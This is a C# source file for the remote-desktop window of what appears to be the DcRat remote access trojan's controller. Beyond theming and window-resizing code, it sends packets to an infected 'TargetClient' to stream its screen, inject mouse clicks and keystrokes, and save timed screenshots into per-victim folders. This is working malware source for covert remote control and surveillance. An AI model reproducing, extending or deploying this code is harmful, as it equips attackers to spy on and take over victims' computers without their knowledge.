using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DcRat.Helper.StreamLibrary.UnsafeCodecs;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;

namespace DcRat.singleForms
{
    public partial class singleFormScreen : Form
    {
        public string HWID { get; set; }
        public bool init = false;
        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public UnsafeOptimizedCodec decoder = new UnsafeOptimizedCodec();
        public Size rdSize;
        private bool isMouse;
        private bool isKeyboard;
        public object syncPicbox = new object();
        private readonly List<Keys> _keysPressed;
        public Image GetImage { get; set; }


        public singleFormScreen()
        {
            _keysPressed = new List<Keys>();
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            InitBorder();
            SetTheme();
        }

        #region Theme

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            buttonmax.BackColor = colorSide;
            buttonmin.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonmax.Image = darkTheme ? Resources.max : Resources.max_dark;
            buttonmin.Image = darkTheme ? Resources.min : Resources.min_dark;

            toolStripscreen.BackColor = colorSide;
            toolStripscreen.ForeColor = colorText;
            toolStripComboBoxquality.BackColor = colorSide;
            toolStripComboBoxquality.ForeColor = colorText;

            toolStripButtonstart.Image = darkTheme ? Resources.play : Resources.play_dark;
            toolStripButtonstop.Image = darkTheme ? Resources.stop : Resources.stop_dark;
            toolStripButtoncapture.Image = darkTheme ? Resources.capture : Resources.capture_dark;
            toolStripButtonkeyboard.Image = darkTheme ? Resources.keyboard : Resources.keyboard_dark;
            toolStripButtonmouse.Image = darkTheme ? Resources.mouse : Resources.mouse_dark;
        }

        #endregion

        #region Border
        public enum MouseDirection
        {
            East,
            West,
            South,
            North,
            Southeast,
            Southwest,
            Northeast,
            Northwest,
            None
        }
        MouseDirection direction;
        Point rectangle;
        void InitBorder()
        {

            MouseDown += BorderMouseDown;

            MouseMove += BorderMouseMove;

            MouseLeave += BorderMouseLeave;
        }

        private void BorderMouseMove(object sender, MouseEventArgs e)
        {
            Point tempEndPoint = e.Location;
            int maxwidth = 800;
            int maxheight = 500;

            if (e.Button == MouseButtons.Left)
            {
                if (direction == MouseDirection.None)
                {
                }
                else if (direction == MouseDirection.East)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }

                }
                else if (direction == MouseDirection.South)
                {
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }
                }
                else if (direction == MouseDirection.West)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }


                }
                else if (direction == MouseDirection.North)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }

                }
                else if (direction == MouseDirection.Southeast)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northeast)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                }
                else if (direction == MouseDirection.Southwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                }
            }
            else
            {
                if (e.Location.X < 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Northwest;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Northeast;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Southeast;
                }
                else if (e.Location.X < 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Southwest;
                }
                else if (e.Location.X < 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.West;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.North;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.East;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.South;
                }
                else
                {
                    Cursor = Cursors.Default;
                    direction = MouseDirection.None;
                }
            }
        }

        private void BorderMouseDown(object sender, MouseEventArgs e)
        {
            rectangle = e.Location;
        }

        private void BorderMouseLeave(object sender, EventArgs e)
        {
            Cursor = Cursors.Default;
            direction = MouseDirection.None;
        }

        #endregion

        #region Move

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);

        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;

        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        #endregion

        private void buttonmin_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void buttonmax_Click(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Maximized)
            {
                WindowState = FormWindowState.Normal;
                pictureBoxscreen.Focus();
            }
            else
            {
                MaximumSize = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
                WindowState = FormWindowState.Maximized;
                pictureBoxscreen.Focus();
            }
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            GetImage?.Dispose();
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "captureClose";
            pack.ForcePathObject("TargetClient").AsString = HWID;

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            Close();
        }

        private void toolStripButtonstart_Click(object sender, EventArgs e)
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "capture";
            pack.ForcePathObject("TargetClient").AsString = HWID;
            pack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(toolStripComboBoxquality.Text);
            pack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(toolStripComboBoxswitch.Text);

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());

            decoder = new UnsafeOptimizedCodec(Convert.ToInt32(toolStripComboBoxquality.Text));
            toolStripComboBoxquality.Enabled = false;
            toolStripComboBoxswitch.Enabled = false;
            toolStripButtoncapture.Enabled = true;
            toolStripButtonmouse.Enabled = true;
            toolStripButtonkeyboard.Enabled = true;

            toolStripButtonstart.Enabled = false;
            toolStripButtonstop.Enabled = true;
        }

        private void toolStripButtonstop_Click(object sender, EventArgs e)
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "captureStop";
            pack.ForcePathObject("TargetClient").AsString = HWID;

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            toolStripComboBoxquality.Enabled = true;
            toolStripComboBoxswitch.Enabled = true;
            toolStripButtoncapture.Enabled = false;
            toolStripButtonmouse.Enabled = false;
            toolStripButtonkeyboard.Enabled = false;

            timerSave.Stop();
            toolStripButtoncapture.Text = "Off";

            toolStripButtonstart.Enabled = true;
            toolStripButtonstop.Enabled = false;
        }

        private void toolStripButtoncapture_Click(object sender, EventArgs e)
        {
            if (toolStripButtonstart.Enabled == false)
            {
                if (timerSave.Enabled)
                {
                    timerSave.Stop();
                    toolStripButtoncapture.Text = "Off";
                }
                else
                {
                    timerSave.Start();
                    toolStripButtoncapture.Text = "On";
                    try
                    {
                        var FullPath = Path.Combine(Application.StartupPath, "Clients Folder", HWID, "RemoteDesktop");
                        if (!Directory.Exists(FullPath)) Directory.CreateDirectory(FullPath);

                        Process.Start(FullPath);
                    }
                    catch
                    {
                    }
                }
            }
        }

        private void toolStripButtonmouse_Click(object sender, EventArgs e)
        {
            if (isMouse)
            {
                isMouse = false;
                toolStripButtonmouse.Text = "Off";
            }
            else
            {
                isMouse = true;
                toolStripButtonmouse.Text = "On";
            }

            pictureBoxscreen.Focus();
        }

        private void toolStripButtonkeyboard_Click(object sender, EventArgs e)
        {
            if (isKeyboard)
            {
                isKeyboard = false;
                toolStripButtonkeyboard.Text = "Off";
            }
            else
            {
                isKeyboard = true;
                toolStripButtonkeyboard.Text = "On";
            }

            pictureBoxscreen.Focus();
        }

        private void singleFormScreen_KeyDown(object sender, KeyEventArgs e)
        {
            if (toolStripButtonstart.Enabled == false && pictureBoxscreen.Image != null &&
                pictureBoxscreen.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode)) e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode)) return;

                _keysPressed.Add(e.KeyCode);

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "keyboardClick";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                pack.ForcePathObject("keyIsDown").SetAsBoolean(true);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void singleFormScreen_KeyUp(object sender, KeyEventArgs e)
        {
            if (toolStripButtonstart.Enabled == false && pictureBoxscreen.Image != null && ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode)) e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "keyboardClick";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                pack.ForcePathObject("keyIsDown").SetAsBoolean(false);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return (key & Keys.CapsLock) == Keys.CapsLock
                   || (key & Keys.NumLock) == Keys.NumLock
                   || (key & Keys.Scroll) == Keys.Scroll;
        }

        private void timerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                var FullPath = Path.Combine(Application.StartupPath, "Clients Folder", HWID, "RemoteDesktop");
                if (!Directory.Exists(FullPath)) Directory.CreateDirectory(FullPath);

                var myEncoder = Encoder.Quality;
                var myEncoderParameters = new EncoderParameters(1);
                var myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                var jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                pictureBoxscreen.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.jpeg",
                    jpgEncoder, myEncoderParameters);
                myEncoderParameters?.Dispose();
                myEncoderParameter?.Dispose();
            }
            catch
            {
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;
            return null;
        }

        private void pictureBoxscreen_MouseDown(object sender, MouseEventArgs e)
        {
            if (toolStripButtonstart.Enabled == false && pictureBoxscreen.Image != null &&
                pictureBoxscreen.ContainsFocus && isMouse)
            {
                var p = new Point(e.X * rdSize.Width / pictureBoxscreen.Width,
                    e.Y * rdSize.Height / pictureBoxscreen.Height);
                var button = 0;
                if (e.Button == MouseButtons.Left) button = 2;

                if (e.Button == MouseButtons.Right) button = 8;

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "mouseClick";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("X").AsInteger = p.X;
                pack.ForcePathObject("Y").AsInteger = p.Y;
                pack.ForcePathObject("Button").AsInteger = button;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void pictureBoxscreen_MouseUp(object sender, MouseEventArgs e)
        {
            if (toolStripButtonstart.Enabled == false && pictureBoxscreen.Image != null &&
                pictureBoxscreen.ContainsFocus && isMouse)
            {
                var p = new Point(e.X * rdSize.Width / pictureBoxscreen.Width,
                    e.Y * rdSize.Height / pictureBoxscreen.Height);
                var button = 0;
                if (e.Button == MouseButtons.Left) button = 4;

                if (e.Button == MouseButtons.Right) button = 16;

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "mouseClick";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("X").AsInteger = p.X;
                pack.ForcePathObject("Y").AsInteger = p.Y;
                pack.ForcePathObject("Button").AsInteger = button;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void pictureBoxscreen_MouseMove(object sender, MouseEventArgs e)
        {
            if (toolStripButtonstart.Enabled == false && pictureBoxscreen.Image != null &&
                pictureBoxscreen.ContainsFocus && isMouse)
            {
                var p = new Point(e.X * rdSize.Width / pictureBoxscreen.Width,
                    e.Y * rdSize.Height / pictureBoxscreen.Height);
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "mouseMove";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("X").AsInteger = p.X;
                pack.ForcePathObject("Y").AsInteger = p.Y;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }
    }
}